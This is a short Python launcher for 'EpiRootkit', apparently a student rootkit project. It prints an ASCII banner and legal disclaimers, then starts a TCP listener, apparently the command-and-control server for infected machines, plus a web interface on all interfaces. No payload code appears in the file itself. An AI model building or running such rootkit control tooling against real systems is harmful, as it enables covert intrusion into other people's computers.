from utils.BigMama import BigMama
import config as cfg
import threading
from app import app

def main():
    print(r"""
      █                                         █░               
       ░█                                    ░██ ▒              
        ▒█▒█                               █▓▒█░ ░              
        ░░ █▓▓█                         ░█▓▓░ ░               
        ░    █▓▓▓                     █▓▓░░   ░  ░       ▓█████  ██▓███   ██▓ ██▀███   ▒█████   ▒█████  ▄▄▄█████▓ ██ ▄█▀ ██▓▄▄▄█████▓
              ░█▓▓       ▓▓██      █▓█  ░               ▓█   ▀ ▓██░  ██▒▓██▒▓██ ▒ ██▒▒██▒  ██▒▒██▒  ██▒▓  ██▒ ▓▒ ██▄█▒ ▓██▒▓  ██▒ ▓▒
              ░   █▓▓▓▓▓▓▓▓▓██████▓▓█    ▒     ▒░░       ▒███   ▓██░ ██▓▒▒██▒▓██ ░▄█ ▒▒██░  ██▒▒██░  ██▒▒ ▓██░ ▒░▓███▄░ ▒██▒▒ ▓██░ ▒░
      ░█▓▓█        ▓▓▓▓▓▓▓▓▓█████████       ▓▓▒░░        ▒▓█  ▄ ▒██▄█▓▒ ▒░██░▒██▀▀█▄  ▒██   ██░▒██   ██░░ ▓██▓ ░ ▓██ █▄ ░██░░ ▓██▓ ░ 
      ░ ▓▓▓▓  ░  ▓▓████▓▓▓▓▓█████████▓     ▓▓▓▓░         ░▒████▒▒██▒ ░  ░░██░░██▓ ▒██▒░ ████▓▒░░ ████▓▒░  ▒██▒ ░ ▒██▒ █▄░██░  ▒██▒ ░ 
         █▓▓█  ▓▓▓▓▓▓▓▓████▓█████▓▓▓▓▓▓▓▓  ▓▓▓ ▒         ░░ ▒░ ░▒▓▒░ ░  ░░▓  ░ ▒▓ ░▒▓░░ ▒░▒░▒░ ░ ▒░▒░▒░   ▒ ░░   ▒ ▒▒ ▓▒░▓    ▒ ░░          
      ░   █▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓█▓▓▓▓▓▓▓▓▓▓▓▓▓▓█▓▓             ░ ░  ░░▒ ░      ▒ ░  ░▒ ░ ▒░  ░ ▒ ▒░   ░ ▒ ▒░     ░    ░ ░▒ ▒░ ▒ ░    ░    
           █▓███▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓█████   ░            ░   ░░        ▒ ░  ░░   ░ ░ ░ ░ ▒  ░ ░ ░ ▒    ░      ░ ░░ ░  ▒ ░  ░      
           █▓▓▓▓████▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓█████▓▓▓█                ░  ░          ░     ░         ░ ░      ░ ░           ░  ░    ░       
      ██████▓▓▓▓▓▓▓▓████▓▓▓▓▓▓▓█████▓▓▓▓▓▓▓██████        
    █▓▓▓██  ▓▓▓▓▓▓▓▓▓▓▓▓████████▓▓▓▓▓▓▓▓▓▓▓█  ██▓▓█      ▄▄▄▄   ▓██   ██▓     ██████ ▄▄▄█████▓▓█████▄  ▄▄▄▄    ▒█████   ▒█████   ██▓    
   █▓▓▓█    ▓▓▓▓▓▓▓▓▓▓▓▓▓▓████▓▓▓▓▓▓▓▓▓▓▓▓▓█    ▓▓▓▓     ▓█████▄  ▒██  ██▒   ▒██    ▒ ▓  ██▒ ▓▒▒██▀ ██▌▓█████▄ ▒██▒  ██▒▒██▒  ██▒▓██▒    
  ▓▓▓▓     █▓▓▓▓▓▓▓▓▓▓▓▓██▓▓█████▓▓▓▓▓▓▓▓▓▓█     ░▓▓▓    ▒██▒ ▄██  ▒██ ██░   ░ ▓██▄   ▒ ▓██░ ▒░░██   █▌▒██▒ ▄██▒██░  ██▒▒██░  ██▒▒██░    
  ▒      ███▓▓▓▓▓▓▓▓▓██▓▓▓▓▓███████▓▓▓▓▓▓▓█████     ░░█  ▒██░█▀    ░ ▐██▓░     ▒   ██▒░ ▓██▓ ░ ░▓█▄   ▌▒██░█▀  ▒██   ██░▒██   ██░▒██░    
       ██████▓▓▓▓▓███▓▓▓▓▓▓▓██████████▓▓▓▓██████     ░   ░▓█  ▀█▓  ░ ██▒▓░   ▒██████▒▒  ▒██▒ ░ ░▒████▓ ░▓█  ▀█▓░ ████▓▒░░ ████▓▒░░██████▒                                                     
       ▓▓    ▓▓▓██▓▓▓▓▓▓▓▓▓▓████████████▓▓    █▓     ░   ░▒▓███▀▒   ██▒▒▒    ▒ ▒▓▒ ▒ ░  ▒ ░░    ▒▒▓  ▒ ░▒▓███▀▒░ ▒░▒░▒░ ░ ▒░▒░▒░ ░ ▒░▓  ░
      ▓▓▓▓    ░▓▓▓▓▓▓▓▓▓▓▓▓▓████████▓▓▓██    ▓▓▓▓        ▒░▒   ░  ▓██ ░▒░    ░ ░▒  ░ ░    ░     ░ ▒  ▒ ▒░▒   ░   ░ ▒ ▒░   ░ ▒ ▒░ ░ ░ ▒  ░
      █▓▓█    ░░▒▓▓▓▓▓▓▓▓▓▓▓████████░█▒░      █▓▓▓         ░    ░  ▒ ▒ ░░     ░  ░  ░    ░       ░ ░  ░  ░    ░ ░ ░ ░ ▒  ░ ░ ░ ▒    ░ ░   
      ▓▓█      ░   ▓▓▓▓▓▓▓▓▓███████░▒░        ▓▓▓█        ░       ░ ░              ░              ░     ░          ░ ░      ░ ░      ░  ░
     ▒                ▓▓▓▓▓▓█████   ░            █             ░  ░ ░                           ░            ░                           
               ░
    """)


    
    print("Starting EpiRootkit attacking program...")
    print("EpiRootkit is a rootkit for educational purposes only.")
    print("It is designed to be used in a controlled environment, such as a virtual machine.")
    print("It is illegal to use this rootkit on a system you do not own or have permission to test.")
    print("EpiRootkit is not responsible for any damage caused by its use.")
    print("Starting the server...")
    cfg.rootkit_connexion = BigMama(tcp_host=cfg.HOST, tcp_port=cfg.PORT)
    cfg.rootkit_connexion.start()
    app.run(host='0.0.0.0', port=5000)
        
if __name__ == '__main__':
    main()